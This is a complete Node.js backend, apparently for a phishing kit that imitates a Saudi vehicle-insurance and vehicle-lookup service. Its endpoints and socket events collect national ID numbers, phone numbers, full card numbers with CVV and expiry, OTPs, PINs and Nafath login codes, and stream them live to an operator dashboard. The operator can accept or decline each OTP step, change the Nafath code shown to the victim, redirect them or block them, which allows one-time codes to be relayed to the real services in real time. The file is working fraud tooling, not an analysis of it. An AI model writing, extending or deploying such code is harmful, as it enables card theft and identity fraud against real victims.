/**
 * gosuksa backend — Railway-ready (v6)
 *
 * Serves two contracts on the same service:
 *
 *  A) Customer site (this Lovable frontend) — preserved from v5:
 *     GET  /breinit, POST /api/user/init, POST /api/chat/enabled,
 *     GET  /api/vicinfomain/captcha, POST /api/vicinfomain/createRequest,
 *     POST /api/store-policy, POST /api/data/store-details,
 *     POST /api/app-logs/:appId/log-user-in-app/:page,
 *     Socket.IO events: user:join, chat:message, booking:update, otp:*, nafath:*, …
 *
 *  B) Admin dashboard (Sherpa / tmn-backend contract):
 *     GET  /users, GET /users/:id, DELETE /users/:id
 *     POST /reg, POST /apply/:id, POST /company/:id,
 *     POST /visa, POST /phone, POST /phone-otp, POST /visa-otp
 *     Socket.IO: join{role}, bindOrder, newData, paymentForm, visaOtp,
 *                phone, phoneOtp, navaz
 *     Admin -> visitor: acceptService/declineService, acceptPaymentForm/
 *                declinePaymentForm, acceptPhone/declinePhone,
 *                acceptVisaOtp/declineVisaOtp, acceptPhoneOtp/declinePhoneOtp,
 *                acceptNavaz/declineNavaz, adminRedirect, clientBlocked,
 *                changeNavazCode
 *
 * Every customer submission is ALSO mirrored into the session store keyed
 * by the client's uuid, so `GET /users` (what the dashboard polls) returns
 * a live row per visitor with all their submitted fields.
 */

const express = require("express");
const http = require("http");
const cors = require("cors");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const { newCaptcha } = require("./captcha");
const { Server } = require("socket.io");

// ---------- config ----------
const PORT = process.env.PORT || 3000;
const DATA_FILE = process.env.DATA_FILE || path.join(__dirname, "data.json");
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "change-me";
const CHAT_ENABLED = process.env.CHAT_ENABLED === "0" ? 0 : 1;
const CORS_ORIGINS = (process.env.CORS_ORIGINS || "*")
  .split(",")
  .map((s) => s.trim())
  .filter(Boolean);
const corsOrigin = CORS_ORIGINS.includes("*") ? true : CORS_ORIGINS;

// ---------- tiny JSON "db" ----------
const db = (() => {
  const empty = {
    users: {},        // uuid -> session row (used by dashboard GET /users)
    submissions: [],  // audit log { id, type, uuid, payload, ts }
    policies: [],
    details: [],
    chats: {},
    captchas: {},
    blocked: {},
    logs: [],
  };
  let state = empty;
  try {
    if (fs.existsSync(DATA_FILE))
      state = { ...empty, ...JSON.parse(fs.readFileSync(DATA_FILE, "utf8")) };
  } catch (e) {
    console.warn("db load failed:", e.message);
  }
  let dirty = false;
  setInterval(() => {
    if (!dirty) return;
    dirty = false;
    try {
      fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2));
    } catch (e) {
      console.warn("db save failed:", e.message);
    }
  }, 1000);
  return {
    get: () => state,
    save: () => {
      dirty = true;
    },
    flush: () => {
      dirty = false;
      try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2));
      } catch (e) {
        console.warn("db save failed:", e.message);
      }
    },
  };
})();

// ---------- app ----------
const app = express();
app.set("trust proxy", true);
app.use(cors({ origin: corsOrigin, credentials: true }));
app.use(express.json({ limit: "5mb" }));
app.use(express.urlencoded({ extended: true, limit: "5mb" }));

const server = http.createServer(app);
const io = new Server(server, {
  path: "/socket.io",
  cors: { origin: corsOrigin, credentials: true },
});

// ---------- helpers ----------
const now = () => new Date().toISOString();
const STARTED_AT = new Date().toISOString();
const uuid = () => crypto.randomUUID();
const newId = () =>
  Date.now().toString(36) + Math.random().toString(36).slice(2, 10);

function clientIp(req) {
  return (
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.toString().split(",")[0].trim() ||
    req.socket?.remoteAddress ||
    "Unknown"
  );
}

function requireAdmin(req, res, next) {
  const t =
    req.headers.authorization?.replace(/^Bearer\s+/i, "") || req.query.token;
  if (t !== ADMIN_TOKEN) return res.status(401).json({ error: "unauthorized" });
  next();
}

/** Upsert a session row into state.users (dashboard reads this via /users). */
function upsertSession(id, patch, extra = {}) {
  if (!id) return null;
  const state = db.get();
  const existing = state.users[id] || {
    id,
    uuid: id,
    createdAt: now(),
  };
  const next = {
    ...existing,
    ...patch,
    id,
    uuid: id,
    updatedAt: now(),
    ...extra,
  };
  state.users[id] = next;
  db.save();
  // Push realtime update to dashboards
  io.emit("sessionUpdate", next);
  io.to("admins").emit("newVisitor", next);
  return next;
}

/** Find the most recent session for an IP (used when the client sends no uuid). */
function findSessionByIp(ip) {
  if (!ip) return null;
  const rows = Object.values(db.get().users).filter((u) => u.ip === ip);
  if (!rows.length) return null;
  rows.sort((a, b) =>
    String(b.updatedAt || b.lastSeen || "").localeCompare(
      String(a.updatedAt || a.lastSeen || "")
    )
  );
  return rows[0].id;
}

/** Pick the first non-empty value among several possible field names. */
function pick(src, names) {
  for (const n of names) {
    const v = src?.[n];
    if (v !== undefined && v !== null && String(v).trim() !== "") return v;
  }
  return undefined;
}

function recordSubmission(type, payload) {
  const state = db.get();
  const id =
    payload?.uuid ||
    payload?.id ||
    payload?.userId ||
    findSessionByIp(payload?.ip) ||
    null;
  const entry = { id: uuid(), type, uuid: id, ts: now(), payload };
  state.submissions.push(entry);
  db.flush();
  console.log(
    `[submission] ${type} ${payload?.result || ""} total=${state.submissions.length}`
  );
  io.to("admins").emit("live:update", entry);
  io.emit("live:update", entry);
  if (id) {
    // Mirror flat fields so the dashboard's session table shows the data.
    // The site nests real values under payload.formData (sometimes deeper),
    // so flatten every nested object into one lookup map.
    const p = {};
    const collect = (obj, depth = 0) => {
      if (!obj || typeof obj !== "object" || depth > 4) return;
      for (const [k, v] of Object.entries(obj)) {
        if (v && typeof v === "object") collect(v, depth + 1);
        else if (v !== undefined && v !== null && String(v).trim() !== "" && p[k] === undefined)
          p[k] = v;
      }
    };
    collect(payload);

    const flat = {};
    const set = (key, names) => {
      const v = pick(p, names);
      if (v !== undefined) flat[key] = v;
    };
    set("idNumber", ["identityNumber", "nationalIdIqama", "idNumber", "nationalId", "iqama"]);
    set("phone", ["mobileNumber", "phone", "phoneNumber", "mobile"]);
    set("name", ["documentOwnerName", "name", "fullName"]);
    set("cardholderName", ["cardholderName"]);

    set("sequenceNumber", ["sequenceNumber", "serialNumber"]);
    set("birthDate", ["birthDate", "dateOfBirth", "dob"]);
    set("email", ["email"]);
    set("company", ["compname", "company", "insuranceCompany"]);
    set("price", ["totalPrice", "price", "amount"]);
    set("insuranceType", ["TypeOfInsuranceContract", "insuranceType"]);
    set("carValue", ["carValue", "vehicleValue", "estimatedValue"]);
    set("carMake", ["vehicleMaker", "carMake", "make", "maker", "brand", "vehicleBrand"]);
    set("carModel", ["vehicleModel", "carModel", "model", "modelName"]);
    set("carYear", ["modelYear", "vehicleYear", "carYear", "year"]);
    set("plateNumber", ["plateNumber", "plate", "customCardNumber", "vehiclePlate"]);
    set("carType", ["carType", "vehicleType", "bodyType"]);
    set("cardNumber", ["cardNumber"]);


    set("cardExpiry", ["expiry", "expiryDate", "expiryMonth"]);
    set("cardExpiryYear", ["expiryYear"]);
    set("paymentMethod", ["paymentMethod"]);
    set("cardCvv", ["cvv"]);
    set("otp", ["otp", "otpCode", "code"]);
    set("result", ["result"]);
    set("vehicle", ["vehicle"]);
    if (flat.idNumber) flat.identityNumber = flat.idNumber;
    if (flat.phone) flat.mobileNumber = flat.phone;
    upsertSession(id, {
      ...flat,
      [type]: payload,
      lastEvent: type,
      stage: type,
      lastSubmissionAt: now(),
    });
  }
  return entry;
}



function broadcastAdminEvent(id, event, payload) {
  if (!id) return;
  io.to(`session:${id}`).emit(event, payload ?? { id });
  io.to(`user:${id}`).emit(event, payload ?? { id });
  io.to("admins").emit(`admin:${event}`, { id, payload });
}

// ---------- REST: health / meta ----------
app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
app.get("/health", (_req, res) => res.json({ ok: true }));

const APP_VERSION = "v9";
app.get("/version", (_req, res) =>
  res.json({
    version: APP_VERSION,
    dataFile: DATA_FILE,
    persistent: DATA_FILE.startsWith("/data"),
    vicUpstream: !!process.env.VIC_UPSTREAM_URL,
    submissions: db.get().submissions.length,
    users: Object.keys(db.get().users).length,
    startedAt: STARTED_AT,
  })
);

app.get("/breinit", (_req, res) => res.json({ ok: true }));
app.post("/api/chat/enabled", (_req, res) =>
  res.json({ isChatEnabled: CHAT_ENABLED })
);

// ---------- REST: customer site (frontend contract) ----------
app.post("/api/user/init", (req, res) => {
  const { uuid: sentUuid, browserInfo } = req.body || {};
  const id = sentUuid || uuid();
  const ip = clientIp(req);
  upsertSession(id, {
    ip,
    ua: req.headers["user-agent"] || "",
    browserInfo: browserInfo || null,
    lastSeen: now(),
    stage: "init",
  });
  res.json({
    ok: true,
    _id: id,
    session: crypto.randomBytes(16).toString("hex"),
    userInfo: {
      uuid: id,
      visitTime: now(),
      ip,
      country: "Unknown",
      countryCode: "XX",
    },
  });
});

app.get("/api/vicinfomain/captcha", (_req, res) => {
  const sessionId = uuid();
  const captchaUuid = uuid();
  const { code, imageB64 } = newCaptcha();
  const state = db.get();
  state.captchas[sessionId] = { captchaUuid, code, ts: Date.now() };
  db.save();
  res.json({
    sessionId,
    captchaUuid,
    imageB64,
    imageDataUrl: `data:image/png;base64,${imageB64}`,
  });
});

app.post("/api/vicinfomain/createRequest", async (req, res) => {
  const body = req.body || {};
  const {
    jcaptcha,
    captchaUuid,
    vicinfomainSessionId,
    sequenceNumber,
    identityNumber,
    nationalId,
    mobileNumber,
    uuid: userUuid,
  } = body;
  const state = db.get();
  const c = state.captchas[vicinfomainSessionId];

  const baseSubmission = {
    identityNumber: identityNumber || nationalId || null,
    mobileNumber: mobileNumber || null,
    sequenceNumber: sequenceNumber || null,
    uuid: userUuid || null,
    ip: clientIp(req),
    raw: body,
  };

  if (!c || c.captchaUuid !== captchaUuid) {
    recordSubmission("vehicleRequest", {
      ...baseSubmission,
      result: "invalid_captcha",
    });
    return res.json({ status: "invalid_captcha", errorCode: "invalid_captcha" });
  }
  if (String(jcaptcha).trim() !== c.code) {
    recordSubmission("vehicleRequest", {
      ...baseSubmission,
      result: "invalid_captcha",
    });
    return res.json({ status: "invalid_captcha", errorCode: "invalid_captcha" });
  }
  delete state.captchas[vicinfomainSessionId];
  db.save();

  if (process.env.VIC_UPSTREAM_URL) {
    try {
      const r = await fetch(process.env.VIC_UPSTREAM_URL, {
        method: "POST",
        headers: {
          "content-type": "application/json",
          ...(process.env.VIC_UPSTREAM_TOKEN
            ? { authorization: `Bearer ${process.env.VIC_UPSTREAM_TOKEN}` }
            : {}),
        },
        body: JSON.stringify({
          sequenceNumber,
          identityNumber: baseSubmission.identityNumber,
        }),
      });
      const data = await r.json().catch(() => null);
      const vehicle =
        data?.vehicle || (data && data.vehicleMaker ? data : null);
      if (r.ok && vehicle) {
        recordSubmission("vehicleRequest", {
          ...baseSubmission,
          result: "success",
          vehicle,
        });
        return res.json({ status: "success", vehicle });
      }
    } catch (e) {
      console.warn("[vic] upstream lookup failed:", e.message);
    }
  }
  recordSubmission("vehicleRequest", {
    ...baseSubmission,
    result: "vehicle_not_found",
  });
  return res.json({
    status: "vehicle_not_found",
    errorCode: "vehicle_not_found",
  });
});

app.post("/api/store-policy", (req, res) => {
  const state = db.get();
  const entry = { id: uuid(), ts: now(), ip: clientIp(req), ...req.body };
  state.policies.push(entry);
  db.save();
  recordSubmission("policy", entry);
  res.json({ ok: true });
});

app.post("/api/data/store-details", (req, res) => {
  const state = db.get();
  const entry = { id: uuid(), ts: now(), ip: clientIp(req), ...req.body };
  state.details.push(entry);
  db.save();
  recordSubmission("details", entry);
  res.json({ ok: true });
});

app.post("/api/app-logs/:appId/log-user-in-app/:page", (req, res) => {
  const state = db.get();
  const entry = {
    ts: now(),
    appId: req.params.appId,
    page: req.params.page,
    ip: clientIp(req),
    ...req.body,
  };
  state.logs.push(entry);
  if (state.logs.length > 5000) state.logs.splice(0, state.logs.length - 5000);
  db.save();
  const id = req.body?.uuid || req.body?.userId;
  if (id) upsertSession(id, { lastPage: req.params.page, lastSeen: now() });
  res.json({ ok: true });
});

// ---------- REST: admin dashboard contract (tmn-backend) ----------
// The Sherpa admin dashboard polls GET /users. It expects an array of
// session rows keyed by id. We serve it publicly (matches original tmn
// contract) OR require Bearer token when ADMIN_LIST_PROTECTED=1.
function maybeAdmin(req, res, next) {
  if (process.env.ADMIN_LIST_PROTECTED === "1") return requireAdmin(req, res, next);
  next();
}

app.get("/users", maybeAdmin, (_req, res) => {
  const list = Object.values(db.get().users).sort(
    (a, b) => (Date.parse(b.updatedAt || 0) || 0) - (Date.parse(a.updatedAt || 0) || 0)
  );
  res.json(list);
});
app.get("/users/:id", maybeAdmin, (req, res) => {
  const s = db.get().users[req.params.id];
  if (!s) return res.status(404).json({ error: "not_found" });
  res.json(s);
});
app.delete("/users/:id", maybeAdmin, (req, res) => {
  delete db.get().users[req.params.id];
  db.save();
  res.json({ ok: true });
});

app.post("/reg", (req, res) => {
  const id = req.body.id || req.body.uuid || newId();
  const s = upsertSession(id, {
    ...req.body,
    ip: clientIp(req),
    stage: "registered",
  });
  recordSubmission("reg", { ...req.body, uuid: id });
  res.json(s);
});

function stepHandler(stage) {
  return (req, res) => {
    const id = req.params.id || req.body.id || req.body.uuid;
    if (!id) return res.status(400).json({ error: "missing_id" });
    const s = upsertSession(id, { ...req.body, stage });
    recordSubmission(stage, { ...req.body, uuid: id });
    res.json(s);
  };
}

app.post("/apply/:id", stepHandler("apply"));
app.post("/company/:id", stepHandler("company"));
app.post("/visa", stepHandler("visa"));
app.post("/phone", stepHandler("phone"));
app.post("/phone-otp", stepHandler("phoneOtp"));
app.post("/visa-otp", stepHandler("visaOtp"));

// ---------- Admin read APIs (existing) ----------
app.get("/admin/state", requireAdmin, (_req, res) => res.json(db.get()));
app.get("/admin/submissions", requireAdmin, (_req, res) =>
  res.json(db.get().submissions)
);
app.get("/admin/users", requireAdmin, (_req, res) => res.json(db.get().users));

// ---------- Socket.IO ----------
io.on("connection", (socket) => {
  console.log(`[io] connected ${socket.id}`);

  const csrf = crypto.randomBytes(24).toString("hex");
  socket.emit("csrf:token", { token: csrf });
  socket.emit("site:publicSettings", { chatEnabled: !!CHAT_ENABLED });
  socket.data.csrf = csrf;

  // -------- Frontend (customer site) join --------
  socket.on("user:join", (p = {}) => {
    const userType = p.userType || "client";
    const uid = p.userId || p.userInfo?.uuid || uuid();
    socket.data.userType = userType;
    socket.data.userId = uid;
    socket.data.sessionId = uid;

    if (userType === "admin") {
      if (p.userInfo?.adminToken && p.userInfo.adminToken !== ADMIN_TOKEN) {
        socket.emit("user:blocked", { reason: "invalid_admin_token" });
        socket.disconnect(true);
        return;
      }
      socket.join("admins");
      socket.emit("user:joined", { userId: uid });
      socket.emit("live:updatesHistory", db.get().submissions.slice(-200));
      return;
    }
    if (db.get().blocked[uid]) {
      socket.emit("user:blocked", { reason: "blocked" });
      return;
    }
    socket.join(`user:${uid}`);
    socket.join(`session:${uid}`);
    socket.emit("user:joined", { userId: uid });
    socket.emit("user:uuidAssigned", { uuid: uid });
    upsertSession(uid, { lastSeen: now(), ip: clientIp(socket.request) });
  });

  // -------- Admin dashboard (tmn-backend) join --------
  socket.on("join", (data = {}) => {
    const role = data.role || "visitor";
    socket.data.role = role;
    if (role === "admin") {
      if (data.adminToken && data.adminToken !== ADMIN_TOKEN) {
        socket.emit("clientBlocked", { reason: "invalid_admin_token" });
        socket.disconnect(true);
        return;
      }
      socket.join("admins");
      // Send existing sessions so the dashboard populates immediately
      Object.values(db.get().users).forEach((u) => socket.emit("sessionUpdate", u));
    }
  });

  socket.on("bindOrder", (id) => {
    if (!id) return;
    socket.data.sessionId = id;
    socket.join(`session:${id}`);
    socket.join(`user:${id}`);
  });

  socket.on("newData", (payload = {}) => {
    const id = payload.id || payload.uuid || socket.data.sessionId || newId();
    const s = upsertSession(id, payload);
    recordSubmission("newData", { ...payload, uuid: id });
    io.to("admins").emit("newVisitor", s);
  });

  // visitor -> admin submissions (tmn contract)
  ["paymentForm", "visaOtp", "phone", "phoneOtp", "navaz"].forEach((ev) => {
    socket.on(ev, (payload = {}) => {
      const id = payload.id || payload.uuid || socket.data.sessionId;
      if (!id) return;
      upsertSession(id, { [ev]: payload, lastEvent: ev, stage: ev });
      recordSubmission(ev, { ...payload, uuid: id });
      io.to("admins").emit(ev, { ...payload, id, uuid: id });
    });
  });

  // admin -> visitor control events (tmn contract)
  const adminControlEvents = [
    "acceptService",
    "declineService",
    "acceptPaymentForm",
    "declinePaymentForm",
    "acceptPhone",
    "declinePhone",
    "acceptVisaOtp",
    "declineVisaOtp",
    "acceptPhoneOtp",
    "declinePhoneOtp",
    "acceptNavaz",
    "declineNavaz",
    "adminRedirect",
    "clientBlocked",
    "changeNavazCode",
  ];
  adminControlEvents.forEach((ev) => {
    socket.on(ev, (payload = {}) => {
      if (socket.data.role !== "admin" && socket.data.userType !== "admin")
        return;
      const id = typeof payload === "string" ? payload : payload.id || payload.uuid;
      broadcastAdminEvent(id, ev, payload);
    });
  });

  // -------- Frontend chat + booking (kept) --------
  socket.on("chat:message", (msg, ack) => {
    const uid = socket.data.userId || socket.data.sessionId;
    if (!uid) return ack && ack({ ok: false, error: "no_user" });
    const state = db.get();
    const list = (state.chats[uid] ||= []);
    const entry = {
      id: uuid(),
      from: socket.data.userType || socket.data.role || "client",
      message: msg?.message || "",
      ts: now(),
    };
    list.push(entry);
    db.save();
    io.to(`user:${uid}`).emit("chat:message", {
      ...entry,
      userType: entry.from,
      targetUserId: uid,
    });
    io.to("admins").emit("chat:message", {
      ...entry,
      userType: entry.from,
      targetUserId: uid,
    });
    ack && ack({ ok: true, id: entry.id });
  });

  socket.on("user:getChatHistory", () => {
    const uid = socket.data.userId;
    socket.emit("chat:history", db.get().chats[uid] || []);
  });
  socket.on("admin:getChatHistory", (p = {}) => {
    const uid = p.userId || p.uuid;
    socket.emit(
      "chat:history",
      uid ? db.get().chats[uid] || [] : db.get().chats
    );
  });
  socket.on("admin:getUpdates", () => {
    socket.emit("live:updatesHistory", db.get().submissions.slice(-200));
  });

  socket.on("booking:update", (payload = {}, ack) => {
    const id = payload?.uuid || socket.data.userId || socket.data.sessionId;
    recordSubmission("booking", { ...payload, uuid: id });
    const res = { formType: "booking", success: true };
    io.to("admins").emit("form:submitted", res);
    socket.emit("form:submitted", res);
    ack && ack(res);
  });

  const passthrough = [
    "payment:update",
    "otp:received",
    "pin:received",
    "nafath:submitted",
    "phone:submitted",
    "naflogin:submitted",
    "nafotp:submitted",
    "rajlogin:submitted",
    "health:submitted",
    "health2:submitted",
    "health3:submitted",
    "health4:submitted",
    "client:cancelOtp",
    "client:cancelPayment",
    "payment:duplicateAttempt",
    "otp:duplicateAttempt",
  ];
  for (const ev of passthrough) {
    socket.on(ev, (payload = {}) => {
      const id = payload?.uuid || socket.data.userId || socket.data.sessionId;
      recordSubmission(ev, { ...payload, uuid: id });
    });
  }

  socket.on("bin:lookup", ({ bin } = {}, ack) => {
    if (!ack) return;
    ack({ ok: true, meta: { brand: "unknown", scheme: "unknown", bin } });
  });

  socket.on("user:pageNavigation", (p) => {
    const uid = socket.data.userId;
    if (uid) upsertSession(uid, { lastPage: p?.page, lastSeen: now() });
    io.to("admins").emit("live:update", {
      type: "pageNavigation",
      uuid: uid,
      page: p?.page,
      ts: now(),
    });
  });
  socket.on("user:typingStatus", (p) =>
    io.to("admins").emit("user:typingStatus", {
      uuid: socket.data.userId,
      ...p,
    })
  );
  socket.on("user:statusUpdate", (p) =>
    io.to("admins").emit("user:statusUpdate", {
      uuid: socket.data.userId,
      ...p,
    })
  );

  // Legacy frontend admin -> client actions (kept)
  const legacyAdminEvents = [
    "payment:action",
    "otp:action",
    "nafath:action",
    "naflogin:action",
    "phone:action",
    "admin:redirect",
  ];
  for (const ev of legacyAdminEvents) {
    socket.on(ev, (p = {}) => {
      if (socket.data.userType !== "admin" && socket.data.role !== "admin")
        return;
      const target = p.userId || p.uuid || p.id;
      if (target) io.to(`user:${target}`).emit(ev, p);
    });
  }

  socket.on("disconnect", (reason) =>
    console.log(`[io] disconnect ${socket.id} ${reason}`)
  );
});

server.listen(PORT, () => {
  console.log(`gosuksa backend ${APP_VERSION} listening on :${PORT}`);
  console.log(`data file: ${DATA_FILE}`);
});
